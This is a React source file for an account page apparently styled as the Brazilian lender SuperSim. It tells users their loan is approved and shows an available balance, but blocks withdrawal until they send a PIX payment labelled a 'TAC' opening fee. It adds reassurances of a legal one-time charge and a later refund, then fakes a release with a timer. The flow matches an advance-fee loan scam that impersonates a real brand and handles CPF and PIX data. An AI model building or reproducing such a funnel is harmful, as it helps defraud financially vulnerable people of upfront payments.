import { useCallback, useEffect, useState } from 'react'
import { useNavigate } from 'react-router-dom'
import {
  Bell,
  CreditCard,
  Eye,
  EyeOff,
  Home,
  Loader2,
  QrCode,
  User,
  Wallet,
  ArrowDownToLine,
  CheckCircle2,
  Shield,
} from 'lucide-react'
import { AdCarousel } from '@/components/ads/AdCarousel'
import { SuperSimLogo } from '@/components/brand/SuperSimLogo'
import { AccountUserCard } from '@/components/conta/AccountUserCard'
import { getAccountTier } from '@/lib/account-tier'
import { AD_BANNERS } from '@/mocks/ad-banners'
import { useFlow } from '@/context/FlowContext'
import { useUtmCapture } from '@/hooks/useUtmCapture'
import { displayName, maskCpf } from '@/lib/cpf'
import { formatPhone } from '@/lib/phone'
import { buildUrlWithUtms } from '@/lib/utm'
import { formatCurrency } from '@/lib/utils'
import { cn } from '@/lib/utils'
import {
  calcAvailableBalance,
  isTacPending,
  isVirtualCardActive,
  TAC_AMOUNT,
  TAC_REFUND_AFTER_INSTALLMENTS,
} from '@/mocks/cartao-data'
import { SaqueAmountDrawer } from './SaqueAmountDrawer'
import { SaqueProcessingScreen } from './SaqueProcessingScreen'
import { TacConfirm, TacForm, TacLegalNotice, TacWaiting } from './TacPixPayment'

type Tab = 'home' | 'saque' | 'dados'
type SaqueStep = 'confirm' | 'processing' | 'tac' | 'tacConfirm' | 'tacWaiting' | 'success'

export function ContaPage() {
  const navigate = useNavigate()
  useUtmCapture()
  const {
    cpf,
    nome,
    email,
    phone,
    loanAmount,
    analiseData,
    cartaoData,
    dueDate,
    contactComplete,
    completeSaque,
    saqueComplete,
    withdrawnAmount,
    pendingTacSaqueAmount,
    payTac,
    submitTacTransfer,
    releaseDepositIfDelivered,
    resetFlow,
  } = useFlow()

  const [tab, setTab] = useState<Tab>('home')
  const [saqueStep, setSaqueStep] = useState<SaqueStep>('confirm')
  const [hideBalance, setHideBalance] = useState(false)
  const [showPush, setShowPush] = useState(true)
  const [showNotifs, setShowNotifs] = useState(false)
  const [drawerOpen, setDrawerOpen] = useState(false)
  const [saqueCents, setSaqueCents] = useState(0)
  const [saqueAmount, setSaqueAmount] = useState(0)

  useEffect(() => {
    if (!cpf || !contactComplete) navigate('/criando')
  }, [cpf, contactComplete, navigate])

  useEffect(() => {
    releaseDepositIfDelivered()
  }, [releaseDepositIfDelivered])

  useEffect(() => {
    if (!isTacPending(cartaoData.tacSubmittedAt, cartaoData.tacPaid)) return
    if (pendingTacSaqueAmount != null) {
      setSaqueAmount(pendingTacSaqueAmount)
    }
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [])

  const availableBalance = calcAvailableBalance(
    loanAmount,
    cartaoData.depositPaid,
    cartaoData.depositAmount,
    cartaoData.depositReleased,
    withdrawnAmount,
  )

  const virtualCardActive = isVirtualCardActive(
    cartaoData.dataComplete,
    cartaoData.depositPaidAt,
    cartaoData.depositReleased,
  )

  const accountTier = getAccountTier(cartaoData, saqueComplete)

  const monthly = analiseData.selectedMonthlyPayment
  const nextDue = new Date()
  nextDue.setMonth(nextDue.getMonth() + 1)
  nextDue.setDate(dueDate ?? 10)

  const isProcessingScreen = saqueStep === 'processing'
  const hideBottomNav =
    isProcessingScreen ||
    saqueStep === 'tac' ||
    saqueStep === 'tacConfirm' ||
    saqueStep === 'tacWaiting'

  function goHome() {
    setTab('home')
    setSaqueStep('confirm')
    setDrawerOpen(false)
  }

  function openDrawer() {
    if (availableBalance <= 0) return
    setSaqueCents(0)
    setDrawerOpen(true)
  }

  function handleDrawerConfirm() {
    const amount = saqueCents / 100
    setSaqueAmount(amount)
    setDrawerOpen(false)
    setTab('saque')
    setSaqueStep('confirm')
  }

  function handleEditAmount() {
    setSaqueCents(Math.round(saqueAmount * 100))
    setDrawerOpen(true)
  }

  function startProcessing() {
    setSaqueStep('processing')
  }

  function startTacPayment() {
    setTab('saque')
    if (isTacPending(cartaoData.tacSubmittedAt, cartaoData.tacPaid)) {
      setSaqueStep('tacWaiting')
      return
    }
    setSaqueStep('tac')
  }

  function confirmTac() {
    submitTacTransfer(saqueAmount)
    setSaqueStep('tacWaiting')
  }

  const handleTacReleased = useCallback(() => {
    if (cartaoData.tacPaid) return
    const amount = pendingTacSaqueAmount ?? saqueAmount
    payTac()
    completeSaque(amount)
    setSaqueAmount(amount)
    setTab('saque')
    setSaqueStep('success')
  }, [cartaoData.tacPaid, completeSaque, payTac, pendingTacSaqueAmount, saqueAmount])

  useEffect(() => {
    if (!isTacPending(cartaoData.tacSubmittedAt, cartaoData.tacPaid)) return
    if (!cartaoData.tacExpectedReleaseAt) return

    const remaining = new Date(cartaoData.tacExpectedReleaseAt).getTime() - Date.now()
    if (remaining <= 0) {
      handleTacReleased()
      return
    }

    const timer = window.setTimeout(handleTacReleased, remaining)
    return () => window.clearTimeout(timer)
  }, [
    cartaoData.tacSubmittedAt,
    cartaoData.tacPaid,
    cartaoData.tacExpectedReleaseAt,
    handleTacReleased,
  ])

  function goCartao() {
    navigate(buildUrlWithUtms('/cartao'))
  }

  return (
    <div className="relative flex min-h-dvh flex-col bg-[#F4F5F7] text-text">
      {showPush && (
        <div className="fixed inset-0 z-[60] flex items-end justify-center bg-black/50 p-4 sm:items-center">
          <div className="w-full max-w-[380px] overflow-hidden rounded-2xl bg-white shadow-2xl">
            <div className="bg-gradient-to-br from-primary to-primary-dark px-5 py-6 text-white">
              <SuperSimLogo height={28} variant="onOrange" showTagline className="mb-3" />
              <p className="text-lg font-bold">Conta ativada!</p>
              <p className="text-sm text-white/80">
                {formatCurrency(availableBalance)} disponível para saque
              </p>
            </div>
            <div className="p-5">
              <p className="mb-4 text-sm text-text-mid">
                Olá, {displayName(nome)}! Seu empréstimo foi aprovado e o valor já está na sua conta
                digital SuperSim.
              </p>
              <button
                type="button"
                onClick={() => setShowPush(false)}
                className="w-full rounded-xl bg-primary px-4 py-3.5 text-sm font-semibold text-white"
              >
                Acessar minha conta
              </button>
            </div>
          </div>
        </div>
      )}

      {showNotifs && (
        <div className="fixed inset-0 z-[55] bg-black/40" onClick={() => setShowNotifs(false)}>
          <div
            className="absolute right-0 top-0 h-full w-full max-w-[380px] bg-white shadow-xl"
            onClick={(e) => e.stopPropagation()}
          >
            <div className="flex items-center gap-3 border-b border-border px-5 py-4">
              <button type="button" onClick={() => setShowNotifs(false)} className="text-sm font-semibold text-primary">
                Voltar
              </button>
              <h2 className="text-lg font-bold">Notificações</h2>
            </div>
            <div className="space-y-3 p-4">
              {!cartaoData.tacPaid && (
                <NotifItem
                  title="TAC pendente"
                  text={`TAC cobrada apenas uma vez na abertura do crédito (proibido por lei cobrar novamente). Valor: ${formatCurrency(TAC_AMOUNT)}. Reembolso após a ${TAC_REFUND_AFTER_INSTALLMENTS}ª parcela.`}
                  time="agora"
                  onClick={() => {
                    setShowNotifs(false)
                    openDrawer()
                  }}
                />
              )}
              {virtualCardActive && (
                <NotifItem
                  title="Cartão virtual ativo"
                  text="Seu cartão SuperSim está pronto para uso online."
                  time="agora"
                  onClick={() => {
                    setShowNotifs(false)
                    goCartao()
                  }}
                />
              )}
              {availableBalance > 0 && (
                <NotifItem
                  title="Saque pendente!"
                  text="Você tem um valor disponível para saque imediato via PIX."
                  time="agora"
                  onClick={() => {
                    setShowNotifs(false)
                    openDrawer()
                  }}
                />
              )}
              <NotifItem
                title="Empréstimo aprovado"
                text={`${formatCurrency(loanAmount)} liberados na sua conta.`}
                time="há 2 min"
              />
              <NotifItem title="Conta criada" text="Sua conta digital SuperSim está ativa." time="há 5 min" />
            </div>
          </div>
        </div>
      )}

      <SaqueAmountDrawer
        open={drawerOpen}
        availableBalance={availableBalance}
        cents={saqueCents}
        onCentsChange={setSaqueCents}
        onClose={() => setDrawerOpen(false)}
        onConfirm={handleDrawerConfirm}
      />

      {saqueStep === 'processing' && (
        <SaqueProcessingScreen
          amount={saqueAmount}
          tacPaid={cartaoData.tacPaid}
          onPayTac={startTacPayment}
          onAlreadyPaid={() => {
            completeSaque(saqueAmount)
            setSaqueStep('success')
          }}
        />
      )}

      {!isProcessingScreen && (
        <header className="sticky top-0 z-40 border-b border-border bg-white px-4 py-3.5">
          <div className="mx-auto flex max-w-[420px] items-center justify-between">
            <SuperSimLogo height={28} />
            <div className="flex items-center gap-2">
              <button
                type="button"
                aria-label="Notificações"
                onClick={() => setShowNotifs(true)}
                className="relative flex size-10 items-center justify-center rounded-full bg-[#F3F4F6] text-text-mid"
              >
                <Bell className="size-[18px]" />
                <span className="absolute right-2 top-2 size-2 rounded-full bg-red-500" />
              </button>
              <div className="flex size-10 items-center justify-center rounded-full border-2 border-primary/30 bg-primary-subtle text-primary-dark">
                <User className="size-5" />
              </div>
            </div>
          </div>
        </header>
      )}

      {!isProcessingScreen && (
        <main className="mx-auto w-full max-w-[420px] flex-1 px-4 pb-24 pt-4">
          {tab === 'home' && (
            <>
              <AccountUserCard name={displayName(nome)} tier={accountTier} />

              <div className="mb-4 rounded-2xl border border-border bg-white p-5 shadow-sm">
                <div className="mb-2 flex items-center justify-between">
                  <span className="text-sm text-text-light">Saldo disponível</span>
                  <button
                    type="button"
                    aria-label="Ocultar saldo"
                    onClick={() => setHideBalance((v) => !v)}
                    className="text-text-light"
                  >
                    {hideBalance ? <EyeOff className="size-5" /> : <Eye className="size-5" />}
                  </button>
                </div>
                <p className={cn('text-3xl font-extrabold text-text', hideBalance && 'blur-sm select-none')}>
                  {formatCurrency(availableBalance)}
                </p>
                <p className="mt-1 text-xs text-green-600">Seu saldo rende 102% do CDI todos os dias.</p>
              </div>

              <div className="mb-4 grid grid-cols-3 gap-2">
                {[
                  { icon: ArrowDownToLine, label: 'Sacar', action: openDrawer },
                  { icon: QrCode, label: 'PIX', action: openDrawer },
                  { icon: CreditCard, label: 'Cartão', action: goCartao },
                ].map((item) => (
                  <button
                    key={item.label}
                    type="button"
                    onClick={item.action}
                    className="flex flex-col items-center gap-2 rounded-xl border border-border bg-white py-4 shadow-sm"
                  >
                    <item.icon className="size-6 text-primary" />
                    <span className="text-xs font-semibold text-text-mid">{item.label}</span>
                  </button>
                ))}
              </div>

              <AdCarousel
                banners={AD_BANNERS}
                onBannerClick={(banner) => {
                  if (banner.id === 'emprestimo-garantia-celular') goCartao()
                  else if (
                    banner.id === 'emprestimo-sem-garantia' ||
                    banner.id === 'emprestimo-agora-na-conta'
                  ) {
                    openDrawer()
                  }
                }}
              />

              {!cartaoData.tacPaid && (
                <>
                  <TacLegalNotice className="mb-4" />
                  <button
                    type="button"
                    onClick={openDrawer}
                    className="mb-4 flex w-full items-start gap-3 rounded-xl border border-[#BFDBFE] bg-[#EFF6FF] p-4 text-left"
                  >
                    <Shield className="mt-0.5 size-5 shrink-0 text-primary" />
                    <div>
                      <p className="text-sm font-bold text-text">TAC pendente</p>
                      <p className="text-xs text-text-mid">
                        Efetue a transferência de {formatCurrency(TAC_AMOUNT)} (Taxa de Abertura de
                        Crédito) para liberar seu primeiro saque. O valor pode ser solicitado para
                        reembolso após a {TAC_REFUND_AFTER_INSTALLMENTS}ª parcela do empréstimo.
                      </p>
                    </div>
                  </button>
                </>
              )}

              {availableBalance > 0 && (
                <button
                  type="button"
                  onClick={openDrawer}
                  className="mb-4 flex w-full items-start gap-3 rounded-xl border border-[#FDE68A] bg-[#FFFBEB] p-4 text-left"
                >
                  <Wallet className="mt-0.5 size-5 shrink-0 text-primary" />
                  <div>
                    <p className="text-sm font-bold text-text">Saque pendente!</p>
                    <p className="text-xs text-text-mid">
                      Você tem um valor disponível para saque imediato via PIX.
                    </p>
                  </div>
                </button>
              )}

              <div className="rounded-2xl border border-border bg-white p-5 shadow-sm">
                <p className="mb-1 text-xs font-bold uppercase text-text-light">Empréstimo ativo</p>
                <p className="text-2xl font-extrabold text-primary-dark">{formatCurrency(loanAmount)}</p>
                <p className="mt-2 text-sm text-text-mid">
                  {analiseData.selectedInstallments}x de {formatCurrency(monthly)}
                </p>
                <p className="mt-3 text-xs text-text-light">
                  Próximo vencimento:{' '}
                  <strong>
                    {nextDue.toLocaleDateString('pt-BR')} - {formatCurrency(monthly)}
                  </strong>
                </p>
                {availableBalance > 0 && (
                  <button
                    type="button"
                    onClick={openDrawer}
                    className="mt-4 flex w-full items-center justify-center gap-2 rounded-xl bg-primary px-4 py-3 text-sm font-semibold text-white"
                  >
                    Sacar
                    <ArrowDownToLine className="size-4" />
                  </button>
                )}
              </div>
            </>
          )}

          {tab === 'saque' && saqueStep === 'tac' && (
            <TacForm
              onConfirm={() => setSaqueStep('tacConfirm')}
              onBack={() => setSaqueStep('processing')}
            />
          )}

          {tab === 'saque' && saqueStep === 'tacConfirm' && (
            <TacConfirm
              onConfirm={confirmTac}
              onEdit={() => setSaqueStep('tac')}
              onBack={() => setSaqueStep('processing')}
            />
          )}

          {tab === 'saque' && saqueStep === 'tacWaiting' && cartaoData.tacSubmittedAt && (
            <TacWaiting submittedAt={cartaoData.tacSubmittedAt} onHome={goHome} />
          )}

          {tab === 'saque' && saqueStep === 'confirm' && (
            <SaqueConfirm
              amount={saqueAmount}
              nome={nome}
              cpf={cpf}
              pixKey={analiseData.pixKey}
              bankName={analiseData.bankName}
              onConfirm={startProcessing}
              onEdit={handleEditAmount}
              onBack={goHome}
            />
          )}

          {tab === 'saque' && saqueStep === 'success' && (
            <SuccessView amount={saqueAmount} onHome={goHome} />
          )}

          {tab === 'dados' && (
            <DadosView
              nome={nome}
              cpf={cpf}
              email={email}
              phone={phone}
              pixKey={analiseData.pixKey}
              bankName={analiseData.bankName}
              onReset={() => {
                resetFlow()
                navigate('/caps')
              }}
            />
          )}
        </main>
      )}

      {!hideBottomNav && (
        <nav className="fixed inset-x-0 bottom-0 z-40 border-t border-border bg-white px-2 pb-[env(safe-area-inset-bottom)]">
          <div className="mx-auto flex max-w-[420px]">
            {(
              [
                { id: 'home' as const, icon: Home, label: 'Home' },
                { id: 'saque' as const, icon: ArrowDownToLine, label: 'Saque' },
                { id: 'dados' as const, icon: User, label: 'Dados' },
              ] as const
            ).map((item) => (
              <button
                key={item.id}
                type="button"
                onClick={() => {
                  if (item.id === 'saque') {
                    if (isTacPending(cartaoData.tacSubmittedAt, cartaoData.tacPaid)) {
                      setTab('saque')
                      setSaqueStep('tacWaiting')
                    } else {
                      openDrawer()
                    }
                  } else {
                    setTab(item.id)
                  }
                }}
                className={cn(
                  'flex flex-1 flex-col items-center gap-1 py-3 text-[11px] font-semibold',
                  tab === item.id ? 'text-primary' : 'text-text-light',
                )}
              >
                <item.icon className="size-5" />
                {item.label}
              </button>
            ))}
          </div>
        </nav>
      )}
    </div>
  )
}

function NotifItem({
  title,
  text,
  time,
  onClick,
}: {
  title: string
  text: string
  time: string
  onClick?: () => void
}) {
  return (
    <button
      type="button"
      onClick={onClick}
      className="w-full rounded-xl border border-border bg-[#F9FAFB] p-4 text-left"
    >
      <div className="mb-1 flex items-center justify-between">
        <span className="text-sm font-bold text-text">{title}</span>
        <span className="text-[11px] text-text-light">{time}</span>
      </div>
      <p className="text-xs text-text-mid">{text}</p>
    </button>
  )
}

function SaqueConfirm({
  amount,
  nome,
  cpf,
  pixKey,
  bankName,
  onConfirm,
  onEdit,
  onBack,
}: {
  amount: number
  nome: string
  cpf: string
  pixKey: string
  bankName: string
  onConfirm: () => void
  onEdit: () => void
  onBack: () => void
}) {
  const [loading, setLoading] = useState(false)

  async function handleConfirm() {
    setLoading(true)
    await new Promise((resolve) => setTimeout(resolve, 1000))
    onConfirm()
  }

  return (
    <div>
      <PageHeader title="Confirmar" onBack={onBack} />
      <div className="rounded-2xl border border-border bg-white p-5 shadow-sm">
        <p className="mb-4 text-sm text-text-mid">
          Verifique todos os dados antes de confirmar. Transferências PIX são processadas
          imediatamente.
        </p>
        <div className="mb-6 space-y-3 text-sm">
          <ConfirmRow label="Valor" value={formatCurrency(amount)} />
          <ConfirmRow label="Para" value={`${nome}\nCPF ${cpf}`} />
          <ConfirmRow label="Chave PIX" value={pixKey} />
          <ConfirmRow label="Banco" value={bankName} />
        </div>
        <button
          type="button"
          onClick={handleConfirm}
          disabled={loading}
          className="mb-3 flex w-full items-center justify-center gap-2 rounded-xl bg-primary px-4 py-4 text-base font-semibold text-white disabled:opacity-80"
        >
          {loading ? (
            <>
              <Loader2 className="size-5 animate-spin" />
              Processando...
            </>
          ) : (
            'Confirmar Transferência'
          )}
        </button>
        <button
          type="button"
          onClick={onEdit}
          disabled={loading}
          className="w-full rounded-xl border border-border px-4 py-3 text-sm font-semibold text-text-mid disabled:opacity-50"
        >
          Alterar valor
        </button>
      </div>
    </div>
  )
}

function SuccessView({ amount, onHome }: { amount: number; onHome: () => void }) {
  return (
    <div className="flex flex-col items-center py-10 text-center">
      <div className="mb-4 flex size-20 items-center justify-center rounded-full bg-green-100 text-green-600">
        <CheckCircle2 className="size-10" />
      </div>
      <h2 className="mb-2 text-xl font-bold">Saque concluído!</h2>
      <p className="mb-2 text-sm text-text-mid">
        {formatCurrency(amount)} serão creditados na sua conta.
      </p>
      <p className="mb-8 text-sm font-semibold text-primary-dark">
        Você deve receber o valor em até 48 horas.
      </p>
      <button
        type="button"
        onClick={onHome}
        className="w-full max-w-xs rounded-xl bg-primary px-4 py-4 text-base font-semibold text-white"
      >
        Voltar ao início
      </button>
    </div>
  )
}

function DadosView({
  nome,
  cpf,
  email,
  phone,
  pixKey,
  bankName,
  onReset,
}: {
  nome: string
  cpf: string
  email: string
  phone: string
  pixKey: string
  bankName: string
  onReset: () => void
}) {
  return (
    <div>
      <h2 className="mb-4 text-xl font-bold">Meus Dados</h2>
      <div className="space-y-3 rounded-2xl border border-border bg-white p-5 shadow-sm">
        <DataRow label="Nome" value={nome} />
        <DataRow label="CPF" value={maskCpf(cpf)} />
        <DataRow label="E-mail" value={email} />
        <DataRow label="Telefone" value={phone ? formatPhone(phone) : '—'} />
        <DataRow label="Chave PIX" value={pixKey} />
        <DataRow label="Banco" value={bankName} />
      </div>
      <button
        type="button"
        onClick={onReset}
        className="mt-6 w-full rounded-xl border border-border px-4 py-3 text-sm font-semibold text-text-light"
      >
        Reiniciar simulação
      </button>
    </div>
  )
}

function PageHeader({ title, onBack }: { title: string; onBack: () => void }) {
  return (
    <div className="mb-4 flex items-center gap-3">
      <button type="button" onClick={onBack} className="text-sm font-semibold text-primary">
        Voltar
      </button>
      <h2 className="text-xl font-bold">{title}</h2>
    </div>
  )
}

function ConfirmRow({ label, value }: { label: string; value: string }) {
  return (
    <div className="flex justify-between gap-4 border-b border-border pb-2 last:border-0">
      <span className="text-text-light">{label}</span>
      <span className="whitespace-pre-line text-right font-semibold">{value}</span>
    </div>
  )
}

function DataRow({ label, value }: { label: string; value: string }) {
  return (
    <div>
      <p className="text-xs font-semibold uppercase text-text-light">{label}</p>
      <p className="text-sm font-semibold text-text">{value || '—'}</p>
    </div>
  )
}
